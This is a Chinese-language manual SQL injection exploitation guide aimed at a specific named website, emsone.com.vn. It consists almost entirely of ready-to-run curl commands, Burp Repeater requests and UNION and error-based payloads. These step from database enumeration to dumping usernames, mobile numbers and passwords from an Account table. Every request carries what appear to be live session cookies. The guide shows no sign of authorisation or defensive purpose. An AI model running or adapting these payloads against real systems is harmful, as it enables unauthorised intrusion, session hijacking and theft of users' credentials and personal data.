# SQL注入手动利用指南

## 目标端点
- `/Handle/SearchListProvince?Type=`
- Union注入：1列

## 手动测试步骤

### 1. 测试Union列数（已确认：1列）
```
Type=1' UNION SELECT NULL--
Type=1' UNION SELECT version()--
```

### 2. 提取数据库版本
```bash
curl -k 'https://emsone.com.vn/Handle/SearchListProvince?Type=1%27%20UNION%20SELECT%20version%28%29--' \
  -H 'Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors'
```

### 3. 提取数据库名
```bash
curl -k 'https://emsone.com.vn/Handle/SearchListProvince?Type=1%27%20UNION%20SELECT%20database%28%29--' \
  -H 'Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors'
```

### 4. 提取所有表名（GROUP_CONCAT）
```bash
curl -k 'https://emsone.com.vn/Handle/SearchListProvince?Type=1%27%20UNION%20SELECT%20GROUP_CONCAT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29--' \
  -H 'Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors'
```

### 5. 提取用户相关表
```bash
curl -k 'https://emsone.com.vn/Handle/SearchListProvince?Type=1%27%20UNION%20SELECT%20GROUP_CONCAT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%20AND%20table_name%20LIKE%20%27%25user%25%27--' \
  -H 'Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors'
```

### 6. 提取Account表列名
```bash
curl -k 'https://emsone.com.vn/Handle/SearchListProvince?Type=1%27%20UNION%20SELECT%20GROUP_CONCAT%28column_name%29%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27Account%27--' \
  -H 'Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors'
```

### 7. 提取用户凭证（CONCAT）
```bash
curl -k 'https://emsone.com.vn/Handle/SearchListProvince?Type=1%27%20UNION%20SELECT%20CONCAT%28ID%2C%27%3A%27%2CUserName%2C%27%3A%27%2CMobileNumber%2C%27%3A%27%2CPassword%29%20FROM%20Account%20LIMIT%200%2C10--' \
  -H 'Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors'
```

### 8. 批量提取所有用户
```bash
curl -k 'https://emsone.com.vn/Handle/SearchListProvince?Type=1%27%20UNION%20SELECT%20GROUP_CONCAT%28CONCAT%28ID%2C%27%3A%27%2CUserName%2C%27%3A%27%2CMobileNumber%2C%27%3A%27%2CPassword%29%20SEPARATOR%20%27%7C%27%29%20FROM%20Account--' \
  -H 'Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors'
```

## Burp Suite测试

直接复制以下请求到Burp Repeater：

### 提取表名
```
GET /Handle/SearchListProvince?Type=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- HTTP/2
Host: emsone.com.vn
Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors
```

### 提取列名
```
GET /Handle/SearchListProvince?Type=1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='Account'-- HTTP/2
Host: emsone.com.vn
Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors
```

### 提取用户数据
```
GET /Handle/SearchListProvince?Type=1' UNION SELECT CONCAT(ID,':',UserName,':',MobileNumber,':',Password) FROM Account LIMIT 0,10-- HTTP/2
Host: emsone.com.vn
Cookie: .ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors
```

## Payload集合

### 基础Union Payload
```
Type=1' UNION SELECT version()--
Type=1' UNION SELECT database()--
Type=1' UNION SELECT user()--
Type=1' UNION SELECT @@version--
```

### 表名提取
```
Type=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
Type=1' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
Type=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%user%'--
Type=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%account%'--
```

### 列名提取
```
Type=1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='Account'--
Type=1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='Account' LIMIT 0,1--
```

### 数据提取
```
Type=1' UNION SELECT CONCAT(ID,':',UserName,':',Password) FROM Account LIMIT 0,1--
Type=1' UNION SELECT CONCAT(ID,':',UserName,':',MobileNumber,':',Password) FROM Account LIMIT 0,10--
Type=1' UNION SELECT GROUP_CONCAT(CONCAT(ID,':',UserName,':',Password) SEPARATOR '|') FROM Account--
```

## 其他可利用端点

### /Handle/SearchListWardByDistrictID
```
DistrictID=1' UNION SELECT version()--
DistrictID=1' UNION SELECT database()--
DistrictID=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
```

### /Handle/SearchListCustomer
```
q=1' UNION SELECT version()--
search=1' UNION SELECT database()--
keyword=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
```

### /Account/GetUserInfo (报错注入)
```
id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
id=1' AND updatexml(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))--
```